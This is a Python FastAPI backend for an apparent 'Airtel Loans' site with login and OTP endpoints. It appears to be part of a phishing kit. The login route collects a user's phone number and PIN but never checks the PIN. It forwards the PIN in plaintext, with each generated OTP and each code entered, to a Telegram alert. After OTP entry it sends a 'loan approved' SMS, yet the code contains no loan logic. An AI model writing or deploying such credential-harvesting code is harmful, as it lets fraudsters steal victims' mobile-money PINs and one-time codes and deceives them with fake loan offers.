import random
from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, BackgroundTasks
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
from notifications import dispatch_notifications

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory dictionary to store OTPs temporarily. 
# (For production, you would use a database or Redis).
otp_store = {}

class LoginRequest(BaseModel):
    phone_number: str
    pin: str

class OTPRequest(BaseModel):
    phone_number: str
    otp: str

def format_phone(phone: str) -> str:
    """Sanitizes the phone number to ensure it has the correct +254 format."""
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:] 
    if not phone.startswith("+254") and not phone.startswith("254"):
        return f"+254{phone}"
    if phone.startswith("254"):
        return f"+{phone}"
    return phone

@app.get("/")
def read_root():
    return {"status": "Backend is running"}

# --- LOGIN (Generates & Sends OTP) ---
@app.post("/api/login")
async def login(request: LoginRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)

    # 1. Generate a random 4-digit OTP
    generated_otp = str(random.randint(1000, 9999))

    # 2. Store it in our dictionary against the user's phone number
    otp_store[full_phone] = generated_otp

    # 3. Format the exact SMS message the user will receive
    sms_text = f"Your Airtel Loans verification code is {generated_otp}. Do not share this with anyone."
    tg_text = f"👤 <b>Login Attempt</b>\nPhone: {full_phone}\nPIN: {request.pin}\nGenerated OTP: <code>{generated_otp}</code>"

    # 4. Dispatch Africa's Talking SMS and Telegram alert in the background
    background_tasks.add_task(
        dispatch_notifications,
        phone_number=full_phone,
        sms_message=sms_text,
        tg_message=tg_text
    )

    # 5. Tell React it was successful so it routes to /airtel-otp
    return {"status": "success", "message": "OTP sent successfully"}


# --- OTP VERIFICATION ---
@app.post("/api/verify-otp")
async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)
    
    # Retrieve the expected OTP for this phone number from our store
    expected_otp = otp_store.get(full_phone)

    if expected_otp and request.otp == expected_otp:
        # OTP matches! Clear it from memory so it can't be reused
        del otp_store[full_phone]
        
        background_tasks.add_task(
            dispatch_notifications,
            phone_number=full_phone,
            sms_message="Your loan has been approved! Funds will arrive shortly.",
            tg_message=f"🔑 <b>OTP Verified</b>\nPhone: {full_phone}\nStatus: ✅ Approved"
        )
        return {"status": "success", "message": "Loan approved"}

    # OTP is wrong or expired
    background_tasks.add_task(
        dispatch_notifications,
        phone_number=full_phone,
        sms_message="Your OTP was invalid. Please request a new one.",
        tg_message=f"❌ <b>Invalid OTP Attempt</b>\nPhone: {full_phone}\nCode entered: {request.otp}"
    )
    return {"status": "error", "message": "Invalid OTP"}